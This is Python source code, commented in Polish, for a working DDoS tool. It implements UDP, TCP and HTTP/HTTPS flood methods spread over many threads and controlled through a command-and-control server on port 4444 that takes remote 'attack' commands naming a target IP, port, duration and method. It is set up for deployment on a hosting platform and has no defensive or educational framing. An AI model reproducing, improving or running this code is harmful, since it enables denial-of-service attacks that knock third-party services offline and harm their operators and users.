import socket
import time
import random
import sys
import threading
import ssl
import os

class DDoS:
    def __init__(self, target_ip, target_port, duration, threads, method="UDP"):
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.threads = threads
        self.method = method.upper()
        self.timeout = time.time() + duration

    def generate_payload(self, size=1024):
        return random._urandom(size)

    def udp_flood(self):
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        payload = self.generate_payload()
        while time.time() < self.timeout:
            try:
                client.sendto(payload, (self.target_ip, self.target_port))
            except:
                pass

    def tcp_flood(self):
        payload = self.generate_payload(512)
        while time.time() < self.timeout:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(1)
                client.connect((self.target_ip, self.target_port))
                client.send(payload)
                client.close()
            except:
                pass

    def http_flood(self):
        while time.time() < self.timeout:
            try:
                client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client.settimeout(1)
                client.connect((self.target_ip, self.target_port))
                
                user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                ]
                request = f"GET / HTTP/1.1\r\nHost: {self.target_ip}\r\nUser-Agent: {random.choice(user_agents)}\r\nConnection: keep-alive\r\n\r\n"
                
                if self.target_port == 443:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    client = context.wrap_socket(client, server_hostname=self.target_ip)
                
                client.send(request.encode())
                client.close()
            except:
                pass

    def run(self):
        print(f"[*] Rozpoczynam atak ({self.method}) na {self.target_ip}:{self.target_port}")
        
        attack_func = None
        if self.method == "UDP":
            attack_func = self.udp_flood
        elif self.method == "TCP":
            attack_func = self.tcp_flood
        elif self.method == "HTTP":
            attack_func = self.http_flood

        for _ in range(self.threads):
            t = threading.Thread(target=attack_func)
            t.daemon = True
            t.start()

        try:
            while time.time() < self.timeout:
                time.sleep(1)
        except KeyboardInterrupt:
            pass


def start_server(host, port):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        print(f"[*] Serwer C2 nasłuchuje na {host}:{port}...")
        
        while True:
            client_socket, addr = server.accept()
            print(f"[*] Nawiązano połączenie z: {addr[0]}:{addr[1]}")
            
            client_thread = threading.Thread(target=handle_client, args=(client_socket,))
            client_thread.daemon = True
            client_thread.start()
            
    except Exception as e:
        print(f"[!] Błąd serwera: {e}")
    finally:
        server.close()

def handle_client(client_socket):
    welcome_msg = """
    ======================================
         WITAJ W PANELU STEROWANIA ENI
    ======================================
    Dostępne komendy:
    - attack [ip] [port] [czas] [metoda: UDP/TCP/HTTP] [wątki]
    - help
    - exit
    ======================================
    C2> """
    try:
        client_socket.send(welcome_msg.encode('utf-8'))

        while True:
            cmd = client_socket.recv(1024).decode('utf-8').strip()
            if not cmd:
                break
                
            if cmd.lower() == 'exit':
                client_socket.send(b"Pa!\n")
                break
                
            elif cmd.lower() == 'help':
                help_text = "Uzycie: attack <ip> <port> <czas_w_sekundach> <UDP|TCP|HTTP> <ilosc_watkow>\nC2> "
                client_socket.send(help_text.encode('utf-8'))
                
            elif cmd.lower().startswith('attack'):
                parts = cmd.split()
                if len(parts) >= 5:
                    target_ip = parts[1]
                    target_port = int(parts[2])
                    duration = int(parts[3])
                    method = parts[4].upper()
                    threads = int(parts[5]) if len(parts) > 5 else 100
                    
                    msg = f"[*] Rozpoczynanie ataku na {target_ip}:{target_port}...\nC2> "
                    client_socket.send(msg.encode('utf-8'))
                    
                    ddos = DDoS(target_ip, target_port, duration, threads, method)
                    t = threading.Thread(target=ddos.run)
                    t.daemon = True
                    t.start()
                else:
                    client_socket.send(b"[!] Zla komenda.\nC2> ")
            else:
                client_socket.send(b"[!] Nieznana komenda.\nC2> ")
    except:
        pass
    finally:
        client_socket.close()

def main():
    # Railway automatycznie podaje port przez zmienną środowiskową PORT.
    # Jeśli nie ma zmiennej (uruchamiasz lokalnie), bierze 4444.
    port = int(os.environ.get("PORT", 4444))
    host = "0.0.0.0"
    
    start_server(host, port)

if __name__ == '__main__':
    main()
